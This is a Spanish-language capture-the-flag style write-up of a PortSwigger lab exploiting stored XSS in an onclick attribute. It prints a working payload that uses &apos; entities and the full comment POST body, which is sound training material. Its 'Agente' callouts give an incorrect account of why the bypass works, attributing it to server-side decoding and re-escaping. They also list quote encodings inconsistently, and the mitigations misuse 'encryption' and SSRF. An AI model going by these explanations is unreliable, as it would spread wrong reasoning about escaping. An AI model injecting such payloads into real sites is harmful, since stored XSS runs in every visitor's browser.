---
title: "Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "stored-xss-into-onclick-event-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-and-backslash-escaped"
author: "Z4k7"
date: "2026-05-04"
year: "2026"
status: "pwned"
tags:
  - "XSS"
  - "Stored"
  - "OnclickEvent"
techniques:
  - "Stored XSS"
  - "Onclick Event Escape"
  - "Quote Bypass"
  - "HTML Entity Encoding"
tools:
  - "BurpSuite"
  - "Repeater"
flags_list:
  - label: "alert"
    value: "Ejecutado exitosamente document.domain"
summary: "Laboratorio de XSS Almacenado en la funcionalidad de comentarios donde la entrada se almacena en un atributo onclick de un elemento HTML. Los corchetes angulares y comillas dobles están codificados en HTML, y las comillas simples y barras invertidas están escapadas. La solución requiere usar entidades HTML (&apos;) para representar comillas simples de manera que el servidor las escape nuevamente, resultando en comillas simples literales que permiten escapar del contexto JavaScript.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios (XSS) almacenada en la funcionalidad de comentarios.
          Para resolver este laboratorio, envíe un comentario que llame a la `alert`función que se activa al hacer clic en el nombre del autor del comentario.

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20onclick%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped/file-20260425153953334.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Ingresamos en el apartado del blog para confirmar el comportamiento del ingreso de datos
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20onclick%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped/file-20260425154122756.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Consultamos si contamos con algún script que se pueda manipular por parte del form
          En la parte del código fuente no contamos con ningún apartado que se pueda manipular por parte de script.
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20onclick%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped/file-20260425154400672.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Contamos con un link de creación de comentario una vez se valida y se confirma el usuario es redirigido a un apartado para la confirmación del cambio por medio del apartado Back to blog
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este laboratorio es más restrictivo que el anterior: - `<` y `>` están codificados en HTML - `'` está codificado en HTML (`&quot;`) - `'` está escapado (convertido a `\\'`) - `\\` está escapado (convertido a `\\`) El truco es que si enviamos `&apos;` (entidad HTML para comilla simple), el servidor lo decodificará a `'` cuando sea almacenado, pero lo escapará a `\\'` para proteger. Sin embargo, la doble transformación puede resultar en una comilla simple literal."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          En el objetivo del laboratorio menciona el proceso para generar el alert es por medio de un click en el nombre del autor consultando el código podremos validar la siguiente información.
      - kind: "code"
        lang: "HTML"
        code: |
          <a id="author" href="https://0a9100770375b2228532086e00ca001d.web-security-academy.net/post?" onclick="var tracker={track(){}};tracker.track('https://0a9100770375b2228532086e00ca001d.web-security-academy.net/post?');">&lt;h1&gt;Name&lt;/h1&gt;</a>
      - kind: "note"
        text: |
          Consultando se puede validar que no es permitido con normalidad el ingreso de `<>` ya que genera el cambio o la codificación del mismo
          En este apartado la información que ingrese en el input de web será tomado como link para el usuario del blog
          Para poder escapar en el apartado de `track()` como no permite aplicar directamente el signo `'` podríamos aplicar el siguiente fragmento de código `&apos` esto se toma como si fuera un `'`
          Enviamos el siguiente fragmento para validar el resultado.
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20onclick%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped/file-20260425185332870.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Permite escapar del código con el siguiente apartado
          `http://evil-site?&apos;`
          Contamos como resultado
      - kind: "code"
        lang: "HTML"
        code: |
          <a id="author" href="http://evil-site?&amp;apos" onclick="var tracker={track(){}};tracker.track('http://evil-site?'');">z4k7</a>
      - kind: "note"
        text: |
          En este caso ya como nos permite escapar podemos aplicar el `alert()` de la siguiente manera
          `http://evil-site?&apos;-alert(document.domain)-&apos;`
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20onclick%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped/file-20260425190029522.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          En este caso se dispara el alert
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20onclick%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped/file-20260425190055244.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20onclick%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped/file-20260425190114083.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20onclick%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped/file-20260425190209156.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El bypass de doble transformación funciona así: 1. Atacante envía: `&apos;-alert(document.domain)-&apos;` 2. Servidor decodifica HTML entities: `'-alert(document.domain)-'` 3. Servidor intenta proteger comillas escapándolas: `\\'-alert(document.domain)-\\'` 4. En JavaScript, `\\` seguido de `'` es una comilla escapada DENTRO de una cadena 5. Pero el contexto es: `tracker.track('URL_AQUÍ')` 6. Si URL_AQUÍ contiene `\\'-alert(...)-\'`, JavaScript lo interpreta como: - `\\'` = comilla literal escapada (dentro de la cadena) - `-alert(document.domain)-` = código fuera de la cadena - `\\'` = comilla literal escapada (cierre) 7. El `-` actúa como operador unario negación, lo que fuerza evaluación del código 8. `alert(document.domain)` se ejecuta"

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          El payload que se inyecta en el campo website:
      - kind: "code"
        lang: "BASH"
        code: |
          http://evil-site?&apos;-alert(document.domain)-&apos;
      - kind: "note"
        text: |
          El flujo de transformación:
          Paso 1: Enviado por atacante
      - kind: "code"
        lang: "BASH"
        code: |
          http://evil-site?&apos;-alert(document.domain)-&apos;
      - kind: "note"
        text: |
          Paso 2: Decodificado por navegador/servidor (entities)
      - kind: "code"
        lang: "BASH"
        code: |
          http://evil-site?'-alert(document.domain)-'
      - kind: "note"
        text: |
          Paso 3: Escapado por servidor (comillas)
      - kind: "code"
        lang: "BASH"
        code: |
          http://evil-site?'-alert(document.domain)-'
      - kind: "note"
        text: |
          Paso 4: Insertado en onclick
      - kind: "code"
        lang: "HTML"
        code: |
          <a id="author" href="http://evil-site?'-alert(document.domain)-'" onclick="var tracker={track(){}};tracker.track('http://evil-site?'-alert(document.domain)-'');">z4k7</a>
      - kind: "note"
        text: |
          Paso 5: JavaScript interpreta
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          tracker.track('http://evil-site?'-alert(document.domain)-'')
      - kind: "note"
        text: |
          JavaScript ve:
      - kind: "bullet"
        text: "'http://evil-site?' — cadena"
      - kind: "bullet"
        text: "- — operador unario (negación)"
      - kind: "bullet"
        text: "alert(document.domain) — función llamada"
      - kind: "bullet"
        text: "- — operador unario"
      - kind: "bullet"
        text: "'' — cadena vacía"
      - kind: "note"
        text: |
          Resultado: `alert(document.domain)` se ejecuta
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20onclick%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped/file-20260425190055244.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El uso de `&apos;` es la clave. Aunque el servidor escapa comillas simples, si enviamos la entidad HTML `&apos;`: 1. El navegador/servidor decodifica a `'` 2. El servidor intenta escapar pero ya es un carácter literal 3. El contexto JavaScript permite que la comilla cierre la cadena 4. Los operadores unarios `-` fuerzan evaluación del código entre las comillas Este es un bypass de 'doble escaping' donde la protección se vuelve contra sí misma."

  - id: "exploit"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          El payload final en el campo website:
      - kind: "code"
        lang: "BASH"
        code: |
          http://evil-site?&apos;-alert(document.domain)-&apos;
      - kind: "note"
        text: |
          Datos POST completos:
      - kind: "code"
        lang: "BASH"
        code: |
          csrf=TOKEN&postId=10&comment=z4k7&name=z4k7&email=z4k7@gmail.com&website=http://evil-site?&apos;-alert(document.domain)-&apos;
      - kind: "note"
        text: |
          Una vez almacenado y cuando un usuario hace clic en el nombre del autor:
          1. El navegador renderiza el HTML con onclick
          2. El usuario hace clic en el nombre del autor
          3. Se ejecuta el código onclick: `tracker.track('...')`
          4. JavaScript interpreta nuestro payload
          5. `-alert(document.domain)-` se ejecuta
          6. La alerta se muestra con el domain

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "alert"
        value: "Ejecutado exitosamente document.domain"

lessons:
  - 'XSS Almacenado en atributos onclick es especialmente peligroso'
  - 'Las entidades HTML (`&apos;`, `&quot;`, etc.) pueden usarse para bypassear escaping'
  - 'El doble escaping (decodificación + escaping nuevamente) puede resultar en bypass'
  - 'Los operadores JavaScript unarios (`-`, `+`, `!`) pueden forzar evaluación de código'
  - 'La combinación de múltiples protecciones puede resultar en vulnerabilidades compuestas'
  - 'El escaping de comillas no es suficiente si el atacante puede usar entidades HTML'
  - 'XSS Almacenado persiste en la base de datos y afecta a todos los usuarios'
mitigation:
  - 'Validar entrada en servidor - solo aceptar URLs válidas con protocolo http/https'
  - 'Sanitizar entrada usando bibliotecas como DOMPurify ANTES de almacenar'
  - 'No confiar en escaping de comillas como única protección'
  - 'Decodificar todas las entidades HTML antes de escapar'
  - 'Usar encriptación de doble capa: decodificar → validar → escapar para contexto específico'
  - 'Implementar Content Security Policy con `script-src ''self''`'
  - 'Usar atributos de seguridad en anchors: `rel="noopener noreferrer"`'
  - 'Auditar regularmente comentarios almacenados'
  - 'Considerar usar input type="url" con validación nativa del navegador'
  - 'Validar que el dominio de website no sea el dominio actual (prevenir SSRF)'
---
